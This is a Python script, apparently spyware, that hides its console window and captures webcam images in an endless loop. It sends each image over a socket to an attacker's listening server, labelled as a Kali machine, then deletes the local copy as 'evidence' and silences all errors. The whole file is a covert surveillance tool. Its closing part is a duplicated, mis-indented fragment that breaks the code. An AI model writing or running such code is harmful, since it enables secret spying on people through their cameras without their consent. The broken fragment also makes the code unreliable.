# File name → secret.pyw   (must save with .pyw extension to hide console window)

import cv2
import socket
import time
import os
import platform

# ------------------ Configuration ------------------
KALI_IP = "192.168.1..."           # ←←← Your Kali Linux / listening server IP
PORT = 9999                         # Port where netcat / server is listening
ALSO_SAVE_ON_WINDOWS = False        # Set True only for local testing
CAPTURE_FILENAME = "capture.png"    # Changed to PNG format
a
INTERVAL_SECONDS = 5                # ← Change this to control delay between captures

# Image format selection (supports both .png and .jpeg)
IMAGE_FORMAT = "png"   # Change to "jpeg" if you prefer JPG format
# ---------------------------------------------------

def get_save_extension():
    """Return appropriate extension based on format selection"""
    if IMAGE_FORMAT.lower() == "jpeg" or IMAGE_FORMAT.lower() == "jpg":
        return ".jpg"
    else:
        return ".png"

def get_capture_filename():
    """Generate filename with correct extension"""
    return f"capture{get_save_extension()}"

def send_file_to_server(filename, server_ip, server_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_ip, server_port))
        
        with open(filename, "rb") as file_handle:
            sock.sendfile(file_handle)
        
        sock.close()
        return True
        
    except Exception:
        return False

def save_image_to_termux(image, filename):
    """Save image with proper path for Termux"""
    try:
        # Check if running on Termux
        if platform.system() == 'Android' or os.path.exists('/data/data/com.termux'):
            # Termux storage path
            termux_path = "/storage/emulated/0/Pictures/"
            full_path = os.path.join(termux_path, filename)
            cv2.imwrite(full_path, image)
            print(f"Image saved to Termux: {full_path}")
            return full_path
        else:
            # Regular save
            cv2.imwrite(filename, image)
            return filename
    except Exception:
        # Fallback to current directory
        cv2.imwrite(filename, image)
        return filename

def capture_image():
    """Capture image and return as array"""
    camera = cv2.VideoCapture(0)
    
    if not camera.isOpened():
        return None
    
    time.sleep(1.2)  # Camera warm-up
    success, frame = camera.read()
    camera.release()
    
    if success:
        return frame
    return None

# Endless loop - runs forever in background
while True:
    try:
        # Get filename with proper extension
        filename = get_capture_filename()
        
        # Capture image
        frame = capture_image()
        
        if frame is not None:
            # Save image with proper format
            if IMAGE_FORMAT.lower() == "jpeg" or IMAGE_FORMAT.lower() == "jpg":
                # JPEG compression
                cv2.imwrite(filename, frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
            else:
                # PNG compression
                cv2.imwrite(filename, frame, [cv2.IMWRITE_PNG_COMPRESSION, 3])
            
            # Optional: save copy to Desktop for debugging (Windows)
            if ALSO_SAVE_ON_WINDOWS and platform.system() == 'Windows':
                desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
                timestamp = int(time.time())
                save_path = os.path.join(desktop_path, f"capture_{timestamp}{get_save_extension()}")
                cv2.imwrite(save_path, frame)
                print(f"Debug copy saved to: {save_path}")
            
            # Try to save to Termux storage
            termux_path = save_image_to_termux(frame, filename)
            
            # Send to your server
            success = send_file_to_server(filename, KALI_IP, PORT)
            
            # Delete local evidence (but keep Termux copy if needed)
            try:
                os.remove(filename)
                print(f"Local file {filename} deleted.")
            except:
                pass

    except Exception as e:
        # Silent on errors, but you can uncomment below for debugging
        # print(f"Error: {e}")
        pass

    # Wait before next capture
    time.sleep(INTERVAL_SECONDS)        # camera = cv2.VideoCapture(1)   # ← use this if external webcam
        
        if not camera.isOpened():
            time.sleep(INTERVAL_SECONDS)    # wait and try again later
            continue

        time.sleep(1.2)     # small delay so camera initializes properly
        
        success, frame = camera.read()
        camera.release()    # very important - release immediately

        if success:
            cv2.imwrite(CAPTURE_FILENAME, frame)
            
            # Optional: save copy to desktop for debugging
            if ALSO_SAVE_ON_WINDOWS:
                desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
                save_path = os.path.join(desktop_path, f"test_{int(time.time())}.jpg")
                cv2.imwrite(save_path, frame)
            
            # Send to your server
            send_file_to_server(CAPTURE_FILENAME, KALI_IP, PORT)
            
            # Delete evidence (optional but recommended)
            try:
                os.remove(CAPTURE_FILENAME)
            except:
                pass

    except Exception:
        pass   # stay silent even on errors

    # Wait before next capture
    time.sleep(INTERVAL_SECONDS)
    
